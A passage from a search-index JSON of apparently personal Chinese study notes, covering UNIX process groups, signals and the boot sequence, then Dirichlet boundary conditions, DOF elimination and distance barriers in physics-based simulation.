\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a Process Group(\u8fdb\u7a0b\u7ec4)\uff0c\u5e76\u5173\u8054\u5230\u4e00\u4e2a Controlling Terminal(\u63a7\u5236\u7ec8\u7aef)\u3002</p> <p>\u7531 <code>fork</code> \u547d\u4ee4\u521b\u5efa\u51fa\u6765\u7684\u8fdb\u7a0b\u5c5e\u4e8e\u540c\u4e00\u4e2a\u8fdb\u7a0b\u7ec4\uff0c\u4f8b\u5982\u7ba1\u9053\u547d\u4ee4\u7b49\u3002</p> <p>Controlling Terminal \u8bb0\u5f55\u5f53\u524d\u6b63\u5728\u524d\u53f0\u7684 Process Group ID\u3002\u7528\u6237\u5728 Shell \u4e2d\u8f93\u5165 <code>Ctrl+C</code>(\u4e2d\u65ad)\u3001<code>Ctrl+Z</code>(\u505c\u6b62)\u3001<code>Ctrl+\\</code>(\u9000\u51fa) \u7b49\u5b57\u7b26\u65f6\u5b9e\u9645\u4e0a\u662f\u53d1\u9001\u7ed9 OS\uff0c\u7531 OS \u5411\u4f4d\u4e8e\u524d\u53f0\u7684\u8fdb\u7a0b\u7ec4\u4e2d\u7684\u6240\u6709\u8fdb\u7a0b\u53d1\u9001\u5bf9\u5e94 signal\uff1a</p> <p></p> <p><code>Ctrl+Z</code> \u76f8\u5f53\u4e8e\u6700\u5c0f\u5316\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>jobs</code> \u67e5\u770b\u6682\u505c\u7684\u7a0b\u5e8f\uff1b\u901a\u8fc7 <code>fg</code> \u6307\u4ee4\u7ee7\u7eed\u6267\u884c\u6682\u505c\u7a0b\u5e8f</p>"},{"location":"Accumulation/NJUOS/virtual/#_6","title":"\u53ef\u6267\u884c\u6587\u4ef6","text":""},{"location":"Accumulation/NJUOS/virtual/#libc","title":"LIBC","text":"<p>\u5728\u64cd\u4f5c\u7cfb\u7edf API \u4e0a\uff0c\u4e3a\u4e86\u670d\u52a1\u5e94\u7528\u7a0b\u5e8f\uff0c\u6709\u5fc5\u8981\u8bbe\u8ba1\u4e00\u5957\u201c\u597d\u7528\u201d\u7684\u5e93\u51fd\u6570\u3002\u867d\u7136 <code>libc</code> \u4eca\u5929\u5df2\u7ecf\u8c08\u4e0d\u4e0a\u201c\u597d\u7528\u201d\uff0c\u4f46\u5b83\u6210\u5c31\u4e86 C \u8bed\u8a00\u4eca\u5929\u7684\u5730\u4f4d\uff0c\u4ee5\u53ca\u4ee5 ISO \u6807\u51c6\u7684\u5f62\u5f0f\u652f\u6491\u4e86\u64cd\u4f5c\u7cfb\u7edf\u751f\u6001\u4e0a\u7684\u4e07\u5343\u5e94\u7528\u3002</p> <p><code>libc</code> \u5927\u90e8\u5206\u4ee3\u7801\u53ef\u4ee5\u901a\u8fc7 C \u8bed\u8a00\u672c\u8eab\u5b9e\u73b0\uff0c\u5c11\u90e8\u5206\u9700\u8981\u4e00\u4e9b\u5e95\u5c42\u652f\u6301\uff0c\u4f8b\u5982\u4f53\u7cfb\u7ed3\u6784\u76f8\u5173\u7684\u5185\u8054\u6c47\u7f16\u8bed\u53e5\u3002</p>"},{"location":"Accumulation/NJUOS/virtual/#_7","title":"\u94fe\u63a5\u548c\u52a0\u8f7d","text":"<p>\u94fe\u63a5\u3001\u865a\u62df\u5185\u5b58\u90e8\u5206\u5728\u522b\u7684\u8bfe\u5b66\u8fc7\u4e86\uff0c\u6b64\u5904\u4e0d\u518d\u8bb0\u5f55</p>"},{"location":"Accumulation/NJUOS/virtual/#_8","title":"\u5e94\u7528\u751f\u6001","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u4ec5\u6709\u4e24\u4e2a\u673a\u5236\uff1a\u521d\u59cb\u72b6\u6001+\u7cfb\u7edf\u8c03\u7528</p> <p>UNIX \u542f\u52a8\u65f6\u521d\u59cb\u72b6\u6001\uff1a</p> <p>&lt;1&gt; <code>initramfs</code> \u4e2d\u7684\u5bf9\u8c61\uff0c\u5305\u62ec\u89e3\u538b\u5e76\u6302\u8f7d\u6839\u6587\u4ef6\u7cfb\u7edf -&gt; &lt;2&gt; <code>/dev/console</code>\uff0c\u662f\u7528\u4e8e IO \u7684\u5173\u952e\u8bbe\u5907 -&gt; &lt;3&gt; \u67e5\u627e\u5e76\u52a0\u8f7d <code>init</code> \u811a\u672c\uff0c\u6b64\u65f6\u624d\u4f1a\u6302\u8f7d\u771f\u5b9e\u6839\u6587\u4ef6\u7cfb\u7edf\uff0c\u4f8b\u5982 <code>/dev/sda1</code>\uff0c\u901a\u8fc7 <code>pivot_root</code> \u6216 <code>switch_root</code> \u7b49\u7cfb\u7edf\u8c03\u7528\u5207\u6362\u5230\u771f\u5b9e\u6839\u6587\u4ef6\u7cfb\u7edf\uff0c\u7136\u540e\u518d\u6267\u884c <code>/sbin/init</code> \u5168\u9762\u521d\u59cb\u5316\u3002</p> <p>\u73b0\u4ee3 Linux \u6267\u884c <code>\\sbin\\init</code> \u4f1a\u5b9a\u5411\u5230 <code>systemd</code></p> <pre><code>Bootloader -&gt; Kernel -&gt;\ninitramfs \u89e3\u538b -&gt; \u6302\u8f7d\u4e3a `/` -&gt;\n/dev/console \u53ef\u7528 -&gt;\n\u6267\u884c `/init` -&gt;\n\u51c6\u5907\u73af\u5883\u3001\u6302\u8f7d\u771f\u5b9e\u6839\u6587\u4ef6\u7cfb\u7edf -&gt;\n\u5207\u6362\u5230\u771f\u5b9e\u6839 -&gt;\n\u6267\u884c `/sbin/init` -&gt; \u7528\u6237\u7a7a\u95f4\u5168\u9762\u542f\u52a8\n</code></pre>"},{"location":"Accumulation/Physics-Based%20Simulation/","title":"Physics-Based Simulation","text":""},{"location":"Accumulation/Physics-Based%20Simulation/#physics-based-simulation","title":"Physics-Based Simulation","text":"<p> \u7ea6 3 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>https://phys-sim-book.github.io/preface.html</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/","title":"Boundary Treatments","text":""},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#boundary-treatments","title":"Boundary Treatments","text":"<p> \u7ea6 3134 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 16 \u5206\u949f</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#dirichlet-boundary-conditions","title":"Dirichlet Boundary Conditions","text":""},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#equality-constraint-formulation","title":"Equality Constraint Formulation","text":"<p>Dirichlet Boundary Conditions(DBC) \u96c6\u6210\u5230\u4f18\u5316\u5668\u4e2d\u65f6\uff0c\u901a\u5e38\u8868\u793a\u4e3a Linear Equality Constraints\uff1a</p> \\[\\tag{5.1.1} Ax=b \\] <ul> <li>\\(A\\) \u662f\u4e00\u4e2a \\(m\\times dn\\) \u7684\u77e9\u9635\uff0c\\(m\\le dn\\)\u3002<ul> <li>\\(d\\) \u662f\u9876\u70b9\u7684 Dimension\uff0c\\(n\\) \u662f\u9876\u70b9\u4e2a\u6570</li> </ul> </li> <li>\\(b\\) \u662f\u4e00\u4e2a \\(m\\times 1\\) \u7684\u5411\u91cf\uff0c\u5b83\u5236\u5b9a\u4e86\u7ea6\u675f\u89c4\u5b9a\u7684\u7cbe\u786e\u503c</li> </ul> <p>Dirichlet Boundary Conditions \u6700\u5e38\u89c1\u7684\u4e24\u79cd\u7c7b\u578b\u662f Sticky \u548c Slip (\u7c98\u6027\u548c\u6ed1\u52a8)\uff1a</p> <ul> <li>&lt;1&gt; Sticky DBC: \u5728\u65f6\u95f4\u6b65\u5185\u5c06\u67d0\u4e9b\u8282\u70b9\u7684\u4f4d\u7f6e\u56fa\u5b9a</li> <li>&lt;2&gt; Slip DBC: \u5c06\u8fb9\u754c\u6761\u4ef6\u8282\u70b9\u7ea6\u675f\u5230\u7279\u5b9a\u7684\u7ebf\u6027\u5b50\u7a7a\u95f4\u5185\uff0c\u4f8b\u5982\u4e00\u4e2a\u5e73\u9762\u6216\u4e00\u6761\u76f4\u7ebf</li> </ul> <p>Sticky Dirichlet Boundary Conditions Example</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5305\u542b\u4e24\u4e2a Node \\((x_{11}, x_{12})\\), \\((x_{21}, x_{22})\\) \u7684 2D System\uff0c\u8981\u5c06\u7b2c\u4e8c\u4e2a\u8282\u70b9\u56fa\u5b9a\u5728\u70b9 \\((1,2)\\) \u4e0a\uff0c\u5219\u8fb9\u754c\u6761\u4ef6\u8868\u793a\u4e3a\uff1a</p> \\[\\left [\\begin{matrix}0 &amp; 0 &amp; 1 &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1\\end{matrix}\\right ] \\left [ \\begin{matrix} x_{11} \\\\ x_{12} \\\\ x_{21} \\\\ x_{22} \\end{matrix} \\right]= \\left[ \\begin{matrix} 1 \\\\ 2 \\end{matrix} \\right].\\] <p>Slip Dirichlet Boundary Conditions Example</p> <p>\u540c\u4e0a\u8282\u70b9\u7cfb\u7edf\uff0c\u60f3\u8981\u7ea6\u675f\u7b2c\u4e00\u4e2a\u8282\u70b9\u5230\u76f4\u7ebf \\(2x+3y=4\\) \u4e0a\uff0c\u5219\u8fb9\u754c\u6761\u4ef6\u8868\u793a\u4e3a\uff1a</p> \\[\\left [\\begin{matrix}2 &amp; 3 &amp; 0 &amp; 0 \\end{matrix}\\right ] \\left [ \\begin{matrix} x_{11} \\\\ x_{12} \\\\ x_{21} \\\\ x_{22} \\end{matrix} \\right]= 4.\\] <p>\u5982\u679c\u6240\u6709\u8fb9\u754c\u6761\u4ef6\u5728\u6bcf\u4e2a\u65f6\u95f4\u6b65\u7684\u5f00\u59cb\u5df2\u7ecf\u6ee1\u8db3\uff0c\u90a3\u4e48\u4f18\u5316\u8fc7\u7a0b\u4e2d\u6211\u4eec\u53ea\u9700\u8981\u63a7\u5236\u8fb9\u754c\u6761\u4ef6\u7684\u4fdd\u6301\u5373\u53ef\uff0c\u8868\u793a\u4e3a\uff1a</p> \\[\\tag{5.1.2} A\\Delta x=0 \\] <p>\u5176\u4e2d\uff0c\\(\\Delta x\\) \u662f\u4f18\u5316\u8fed\u4ee3\u4e2d\u7684\u641c\u7d22\u65b9\u5411\uff08\u8282\u70b9\u66f4\u65b0\u65f6\u7528\u5230\u641c\u7d22\u65b9\u5411\u548c\u641c\u7d22\u6b65\u957f \\(x+\\alpha \\Delta x\\)\uff09</p> <p>\u4e3a\u4e86\u5728\u65f6\u95f4\u6b65\u5f3a\u5236\u6267\u884c (5.1.2)\uff0c\u6211\u4eec\u5728\u6c42\u89e3\u641c\u7d22\u65b9\u5411 \\(\\Delta x\\) \u7684\u725b\u987f\u8fed\u4ee3\u4e2d\u5904\u7406\u8fd9\u4e2a\u95ee\u9898\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u6d89\u53ca\u4f7f\u7528 Incremental Potential \u7684\u4e8c\u6b21\u8fd1\u4f3c\u6765\u5f62\u6210\u62c9\u683c\u6717\u65e5\u51fd\u6570\uff1a</p> \\[ L(\\Delta x, \\lambda)= \\frac{1}{2}\\Delta x^T H\\Delta x+ g^T \\Delta x + \\lambda^T A\\Delta x \\] <p>\u5728\u8fd9\u91cc\uff0c\\(g,H\\) \u5206\u522b\u662f IP \u7684 Grad \u548c Hessian\uff08\u4e00\u9636\u5bfc\u548c\u4e8c\u9636\u5bfc\uff09\uff1b\\(\\lambda\\) \u662f\u4e00\u4e2a \\(m\\times 1\\) \u7684\u62c9\u683c\u6717\u65e5\u4e58\u5b50\u5411\u91cf\u3002</p> <p>\u901a\u8fc7\u6700\u5927-\u6700\u5c0f\u4f18\u5316 \\(L(\\Delta x, \\lambda)\\) \u6765\u5904\u7406\u8fd9\u4e2a\u95ee\u9898\uff1a</p> \\[ \\max_{\\lambda} \\min_{\\Delta x} L(\\Delta x, \\lambda) \\] <p>\u6211\u4eec\u4e00\u65b9\u9762\u60f3\u8981 IP \u6700\u5c0f\uff0c\u4e00\u65b9\u9762\u60f3\u8981\u4fdd\u6301 (5.1.2)</p> <p>\u7ecf\u8fc7\u5408\u7406\u6c42\u89e3\u540e\uff0c\u8f6c\u6362\u6210\u5982\u4e0b\u91cd\u8981 KKT \u7cfb\u7edf\uff1a</p> \\[\\tag{5.1.3} \\left[\\begin{matrix} H &amp; A^T \\\\ A &amp;  \\end{matrix}\\right]\\left[\\begin{matrix} \\Delta x \\\\ \\lambda \\end{matrix}\\right] = \\left[ \\begin{matrix} -g \\\\ 0\\end{matrix} \\right]. \\] <p>\u8be5\u7cfb\u7edf\u4e0d\u662f\u5bf9\u79f0\u6b63\u5b9a\u7684\uff0c\u5e76\u4e14\u5176\u5927\u5c0f\u9501\u7740\u8fb9\u754c\u8282\u70b9\u6570\u91cf\u589e\u52a0\u800c\u589e\u52a0</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#dof-elimination-method","title":"DOF Elimination Method","text":"<p>\u5bf9\u4e8e\u6700\u7b80\u5355\u7684 Sticky BC\uff0c\u5176\u7ea6\u675f\u77e9\u9635 \\(A\\) \u4ec5\u8d77\u5230\u4e86\u9009\u62e9\u7684\u4f5c\u7528\uff0c\u5177\u4f53\u6765\u8bf4\u5c31\u662f\u53ea\u5728 BC \u8282\u70b9\u5bf9\u5e94\u5904\u4e3a 1\uff0c\u5176\u4f59\u4e3a 0\u3002</p> <p>\u7531\u6b64\uff0c\u53ef\u4ee5\u8bc1\u660e\u5f97\u5230 \\(AA^T\\) \u4e3a\u4e00\u4e2a \\(m\\times m\\) \u7684\u5355\u4f4d\u77e9\u9635\uff1b\\(A^TA\\) \u662f\u4e00\u4e2a \\(dn\\times dn\\) \u7684\u5bf9\u89d2\u77e9\u9635\uff0c\u53ea\u6709 BC \u8282\u70b9\u7684\u5bf9\u5e94\u9879\u4e3a 1\uff0c\u5176\u4f59\u4e3a 0\u3002</p> <p>\u77e5\u9053\u5982\u4e0a\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u5bf9 (5.1.3) \u7684\u4e0a\u534a\u90e8\u5206\u5de6\u4e58\u4e00\u4e2a \\(A\\)\uff1a</p> \\[ \\left[\\begin{matrix} AH &amp; AA^T \\\\ A &amp;  \\end{matrix}\\right]\\left[\\begin{matrix} \\Delta x \\\\ \\lambda \\end{matrix}\\right] = \\left[ \\begin{matrix} -Ag \\\\ 0\\end{matrix} \\right]. \\] <p>\u53ef\u4ee5\u76f4\u63a5\u89e3\u51fa \\(\\lambda\\)\uff1a</p> \\[\\tag{5.2.1} \\lambda = -AH \\Delta x - Ag \\] <p>\u5c06 (5.2.1) \u4ee3\u56de (5.1.3) \u89e3\u51fa \\(\\Delta x\\)\uff1a</p> \\[\\tag{5.2.2} (I-A^TA)H \\Delta x = (I-A^TA) (-g) \\] <p>\u6b64\u5904 \\(I-A^TA\\) \u77e9\u9635\u76f8\u5f53\u4e8e\u201c\u5c4f\u853d\u201d\u4e86\u90a3\u4e48 BC \u8282\u70b9\u7684\u884c\uff0c\u5373\u53ea\u4fdd\u7559\u4e86\u975e\u7ea6\u675f\u8282\u70b9\u7684\u4fe1\u606f\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e\u7b2c\u4e8c\u4e2a\u5757\u884c\u5728\u539f\u65b9\u7a0b\u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86 BC \u8282\u70b9\u7684 \\(\\Delta x\\)\uff08\u8fd9\u4e9b\u8282\u70b9\u662f\u5df2\u77e5\u7684\uff0c\u4e00\u822c\u4e3a 0\uff0c\u5373\u4fdd\u6301\u539f\u4f4d\u7f6e\uff09\uff0c\u56e0\u6b64\uff085.2.2\uff09\u662f\u4e00\u4e2a\u6b20\u7ea6\u675f\u7cfb\u7edf\u3002\u8003\u8651\u5230\u8fd9\u70b9\uff0c\u53ef\u4ee5\u5c06\u6574\u4e2a\u7cfb\u7edf\u6309\u7167 BC \u8282\u70b9\u548c\u975e BC \u8282\u70b9\uff08\u8bb0\u4f5c B \u548c U\uff09\u7684\u65b9\u5f0f\u8fdb\u884c\u5206\u5757\uff1a</p> \\[H=\\left[\\begin{matrix}H_{BB} &amp; H_{UB} \\\\ H_{BU} &amp; H_{UU} \\end{matrix}\\right],\u0394x=\\left[\\begin{matrix}\u0394x_B \\\\ \u0394x_U\\end{matrix}\\right],g=\\left[\\begin{matrix}g_B \\\\ g_U\\end{matrix}\\right].\\] <p>\u7531\u4e8e BC \u8282\u70b9\u7684\u4f4d\u79fb\u53d8\u5316 \\(\\Delta x_B = 0\\)\uff08\u56fa\u5b9a\u8fb9\u754c\u6761\u4ef6\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u7cfb\u7edf\u7b80\u5316\u4e3a\u53ea\u6c42\u89e3\u975e\u7ea6\u675f\u8282\u70b9\u7684\u65b9\u7a0b\uff1a</p> \\[H_{UU}\\Delta x_U = -g_U. \\tag{5.2.3}\\] <p>\u8fd9\u5c31\u662f\u4e00\u4e2a\u5bf9\u79f0\u6b63\u5b9a\uff08SPD\uff09\u7684\u7ebf\u6027\u7cfb\u7edf\uff0c\u53ea\u5305\u542b\u975e BC \u8282\u70b9\uff0c\u4ece\u800c\u5927\u5927\u964d\u4f4e\u4e86\u6c42\u89e3\u89c4\u6a21\u548c\u590d\u6742\u5ea6\u3002</p> <p>\u4e0a\u8ff0\u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u6570\u5b66\u89e3\u91ca\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u6784\u5efa (5.2.3) \u65b9\u7a0b\u6d89\u53ca\u5230\u91cd\u65b0\u6392\u5217\u81ea\u7531\u5ea6\u7b49\u7e41\u7410\u4f4e\u6548\u7684\u8fc7\u7a0b\uff0c\u901a\u5e38\u88ab\u907f\u514d\u3002</p> <p>\u4e3a\u4e86\u907f\u514d\u91cd\u65b0\u6392\u5217\u81ea\u7531\u5ea6\u7684\u9700\u8981\uff0c\u53ef\u4ee5\u5bf9\u539f\u59cb\u7ebf\u6027\u7cfb\u7edf\u76f4\u63a5\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u5176\u4e0e\u65b9\u7a0b (5.2.3) \u4e00\u81f4\u3002\u5177\u4f53\u800c\u8a00\uff1a</p> <ul> <li>\u5c06 \\(g\\) \u5185\u5bf9\u5e94\u8fb9\u754c\u6761\u4ef6\u8282\u70b9\u7684\u884c\u90fd\u7f6e 0</li> <li>\u5bf9\u4e8e \\(H\\) \u4e2d\u4e0e BC \u8282\u70b9\u76f8\u5173\u7684\u884c\u548c\u5217\uff0c\u5bf9\u89d2\u9879\u8bbe\u7f6e\u4e3a 1\uff0c\u5176\u4f59\u7f6e 0</li> </ul> <p></p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#slip-dirichlet-boundary-conditions","title":"Slip Dirichlet Boundary Conditions","text":"<p>\u4e0e Sticky DBC \u4e0d\u540c\uff0c\u4e00\u822c\u7684 Slip DBC \u4e0d\u80fd\u901a\u8fc7 DOF Elimination Method \u89e3\u51b3\u3002\u4e3a\u4e86\u5e94\u5bf9\u8fd9\u79cd\u590d\u6742\u6027\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u57fa\u53d8\u6362\u7b56\u7565\u3002</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#axis-aligned-slip-dbc","title":"Axis-Aligned Slip DBC","text":"<p>\u5728\u6df1\u5165\u7814\u7a76\u66f4\u4e00\u822c\u7684\u60c5\u51b5\u524d\uff0c\u6211\u4eec\u9996\u5148\u8003\u5bdf\u90a3\u4e9b\u8f74\u5bf9\u9f50\u7684\u6ed1\u52a8 DBC\u3002</p> <p>\u8f74\u5bf9\u9f50\u6ed1\u52a8 DBC \u7684\u4e00\u4e2a\u4f18\u70b9\u5c31\u662f\u5b83\u4eec\u7684\u7ea6\u675f\u77e9\u9635\u548c\u7c98\u6027 DBC \u76f8\u4f3c\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u901a\u8fc7\u76f8\u540c\u7684\u81ea\u7531\u5ea6\u6d88\u9664\u65b9\u6cd5\u8fdb\u884c\u7ba1\u7406\u6c42\u89e3\uff1a</p> <p></p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#change-of-variables","title":"Change of Variables","text":"<p>\u5728\u5904\u7406\u4e00\u822c Slip DBC \u65f6\uff0c\u4e00\u4e2a\u5c40\u9650\u6027\u4f53\u73b0\u5728 \\(AA^T\\) \u4e0d\u662f\u4e00\u4e2a \\(m\\times m\\) \u7684\u5355\u4f4d\u77e9\u9635\uff0c\u6211\u4eec\u540c\u4e0a\u8fdb\u884c\u62c9\u683c\u6717\u65e5\u5904\u7406\uff1a</p> \\[\\tag{6.2.1} \\lambda =-(AA^T) ^{-1} AH\\Delta x - (AA^T) ^{-1} Ag \\] \\[\\tag{6.2.1} (I-A^T (AA^T) ^{-1} A) H\\Delta x = (I- A^T (AA^T) ^{-1} A) -g \\] <p>\u8fd9\u91cc \\(I-A^T (AA^T) ^{-1} A\\) \u6ca1\u6709\u7279\u6b8a\u7684\u7ed3\u6784\uff0c\u8fd9\u4f7f\u5f97\u81ea\u7531\u5ea6\u6d88\u9664\u65b9\u6cd5\u96be\u4ee5\u5e94\u7528\u3002</p> <p>\u4e3a\u4e86\u7b80\u5316\u7ea6\u675f\uff0c\u6211\u4eec\u5bf9\u7ea6\u675f\u77e9\u9635 \\(A\\) \u8fdb\u884c\u5947\u5f02\u503c\u5206\u89e3(SVD)\uff1a</p> \\[ A=USV^T \\] <ul> <li>\\(U\\) \u662f \\(m\\times m\\) \u7684\u6b63\u4ea4\u77e9\u9635</li> <li>\\(V\\) \u662f \\(dn\\times dn\\) \u7684\u6b63\u4ea4\u77e9\u9635</li> <li>\\(S\\) \u662f \\(m\\times dn\\) \u7684\u5bf9\u89d2\u77e9\u9635</li> </ul> <p>\u901a\u8fc7\u5b9a\u4e49 \\(y=V^T\\Delta x\\) \u548c \\(\\lambda ' =U^T\\lambda\\)\uff0c\u6211\u4eec\u5c06 KKT \u7cfb\u7edf (5.1.3) \u91cd\u65b0\u683c\u5f0f\u5316\uff1a</p> \\[\\tag{6.2.3} \\left[\\begin{matrix} V^THV &amp; S^T \\\\ S &amp; 0 \\end{matrix}\\right]\\left [\\begin{matrix}y \\\\ \\lambda ' \\end{matrix}\\right]= \\left[\\begin{matrix} -V^Tg \\\\ 0\\end{matrix} \\right] \\] <p>\u4e00\u65e6\u6211\u4eec\u89e3\u51fa \\(y\\) \uff0c\u90a3\u4e48 \\(\\Delta x\\) \u53ef\u4ee5\u901a\u8fc7 \\(\\Delta x=Vy\\) \u8f7b\u677e\u6062\u590d\u3002</p> <p>Limitations of SVD</p> <ul> <li>\u5bf9\u5927\u77e9\u9635\u6267\u884c SVD \u5177\u6709\u6311\u6218\u6027\uff0cimpractical</li> <li>\u6b63\u4ea4\u77e9\u9635 \\(V\\) \u901a\u5e38\u662f\u5bc6\u96c6\u7684\uff0c\u90a3\u4e48\u5bf9 \\(V^THV\\) \u8fdb\u884c\u53d8\u91cf\u66ff\u6362\u8ba1\u7b97\u6548\u7387\u8f83\u4f4e\u3001\u6210\u672c\u8f83\u9ad8</li> </ul>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#general-slip-dbc","title":"General Slip DBC","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u5728 3D \u5e73\u9762\u4e0a\u4e92\u52a8\u7684\u8282\u70b9 \\(i\\) \u7684 DBC\uff0c\u53ef\u4ee5\u8868\u793a\u4e3a\uff1a</p> \\[ n_i^T \\Delta x_i =0 \\] <p>\u5176\u4e2d \\(n_i\\) \u662f\u6ed1\u52a8\u5e73\u9762\u7684\u6cd5\u7ebf\u3002\u5bf9\u5411\u91cf \\(n_i\\) \u8fdb\u884c SVD\uff0c\u6211\u4eec\u5f97\u5230\uff1a</p> \\[\\tag{6.3.1} n_i^T= U_i S_i V_i^T =1 \\left[\\begin{matrix}1 &amp; 0 &amp; 0\\end{matrix}\\right] \\left[\\begin{matrix} n_i^T \\\\ m_i^T \\\\ l_i^T\\end{matrix}\\right] \\] <p>\u5355\u4f4d\u5411\u91cf \\(n_i\\), \\(m_i\\) \u548c \\(l_i\\) \u7ec4\u6210\u4e86 3D orthonormal basis\uff08\u4e09\u7ef4\u6b63\u4ea4\u5f52\u4e00\u57fa\uff09\uff0c\u8fd9\u79cd\u5206\u89e3\u6709\u52a9\u4e8e\u6211\u4eec\u5728\u540e\u7eed\u5904\u7406\u4e2d\u6709\u9488\u5bf9\u6027\u7684\u5c06\u201c\u6cd5\u5411\u201d\u65b9\u5411\u53d8\u5316\u7f6e 0\uff0c\u800c\u4fdd\u7559\u5207\u5411\u65b9\u5411\u3002</p> <p>\u6b63\u4ea4\u5f52\u4e00\u57fa</p> <p>\u5185\u79ef\u7a7a\u95f4\u4e2d\u4e00\u7ec4\u5411\u91cf\u57fa\u5e95\u4e2d\u6bcf\u4e2a\u5411\u91cf\u6a21\u957f\u90fd\u4e3a 1\uff0c\u4e14\u6bcf\u4e24\u4e2a\u5411\u91cf\u90fd\u6b63\u4ea4</p> <p>\u63a5\u4e0b\u6765\u5bf9 Hessian \u77e9\u9635\u7b49\u8fdb\u884c\u5904\u7406\uff0c\u5f97\u5230\u53ef\u4ee5\u4f7f\u7528 DOF \u6d88\u9664\u6cd5\u8fdb\u884c\u5904\u7406\u7684\u7cfb\u7edf\u3002</p> <p>\u6b64\u5904\u5904\u7406\u6ca1\u80fd\u7406\u89e3\u6e05\u695a\uff0c\u56e0\u6b64\u5c31\u4e0d\u5199\u5230\u8fd9\u4e86\uff0c\u8bf7\u81ea\u5df1\u53bb\u770b\u539f\u6587</p> <p></p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#distance-barrier-for-nonpenetration","title":"Distance Barrier for Nonpenetration","text":"<p>Contact Modeling \u662f\u786e\u4fdd\u56fa\u4f53\u4e0d\u4e0e\u969c\u788d\u7269\u6216\u81ea\u8eab\u76f8\u4ea4\u7684\u5173\u952e\u3002\u672c\u8282\u6211\u4eec\u5c06\u6df1\u5165\u63a2\u8ba8 IPC \u6846\u67b6\u4e2d\u975e\u7a7f\u900f\u6027\u5177\u4f53\u7ec6\u8282\u3002</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#signed-distance","title":"Signed Distance","text":"<p>\u7b26\u53f7\u8ddd\u79bb\u62d3\u5c55\u4e86\u65e0\u7b26\u53f7\u8ddd\u79bb\u7684\u6982\u5ff5\uff0c\u4f7f\u5176\u80fd\u591f\u6db5\u76d6\u5177\u6709\u5c01\u95ed\u8fb9\u754c\u7684\u56fa\u4f53\u51e0\u4f55\u5f62\u72b6\u3002IPC \u901a\u8fc7\u975e\u7a7f\u900f\u6027\u7ea6\u675f\u6d88\u9664\u4e86\u56fa\u4f53\u5185\u90e8\u51fa\u73b0\u8d1f\u8ddd\u79bb\u7684\u53ef\u80fd\u6027\uff0c\u56e0\u6b64\uff0c\u5728\u7b26\u53f7\u8ddd\u79bb\u4fdd\u6301\u975e\u8d1f\u7684\u72b6\u6001\u4e0b\uff0c\u975e\u7a7f\u900f\u6027\u6210\u529f\u5b9e\u73b0\u3002</p> <p>Codimension</p> <p>\u4f59\u7ef4\u6570\u6307\uff0c\u5bf9\u4e8e\u7a7a\u95f4 \\(V\\) \u7684\u7ebf\u6027\u5b50\u7a7a\u95f4 \\(W\\)\uff0c\\(W\\) \u5728 \\(V\\) \u4e2d\u7684\u4f59\u7ef4\u6570\u662f\u5b83\u4eec\u7ef4\u5ea6\u7684\u5dee\uff1a</p> \\[codim(W)=din(V)-dim(W)\\] <p>\u4f8b\u5982\u5728\u4e09\u7ef4\u7a7a\u95f4\u4e2d\uff0c\u4e00\u4e2a\u5e73\u9762\u7684\u4f59\u7ef4\u6570\u4e3a 1\uff0c\u4e00\u6761\u76f4\u7ebf\u7684\u4f59\u7ef4\u6570\u4e3a 2\u3002\u5728 CG \u4e2d\uff0c\u901a\u5e38\u7528\u4f59\u7ef4\u6570\u4e3a 1\u30012 \u7684\u51e0\u4f55\u6a21\u62df\u5e03\u6599\u548c\u5934\u53d1\u3002</p> <p>\u4f46\u662f\u6709\u7b26\u53f7\u8ddd\u79bb\u5e38\u7528\u4e8e\u53c2\u6570\u8868\u793a\u7684\u51e0\u4f55\u4ee5\u53ca Grid \u8868\u793a\u7684\u51e0\u4f55\u4e2d\uff0c\u6b64\u5904\u6211\u6682\u4e0d\u6df1\u7a76\u3002</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#distance-barrier","title":"Distance Barrier","text":"<p>\u5f53\u7b26\u53f7\u8ddd\u79bb\u5728\u969c\u788d\u7269\u5916\u90e8\u5e73\u6ed1\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5f15\u5165\u975e\u7a7f\u900f\u7ea6\u675f\u6765\u6a21\u62df\u63a5\u89e6\u3002\u8fd9\u4e9b\u7ea6\u675f\u4f7f\u7528 \\(d(x)\\) \u8fdb\u884c\u516c\u5f0f\u5316\uff0c\u65e8\u5728\u6700\u5c0f\u5316\u7cfb\u7edf\u7684 Incremental Potential\uff1a</p> \\[\\tag{7.2.1} \\min_x E(x)\\ \\ s.t.\\ d_{ij}\\ge 0 \\] <p>\u5176\u4e2d \\(d_{ij}\\) \u8868\u793a\u4efb\u610f\u8282\u70b9 \\(i\\) \u4e0e\u4efb\u610f\u969c\u788d\u7269 \\(j\\) 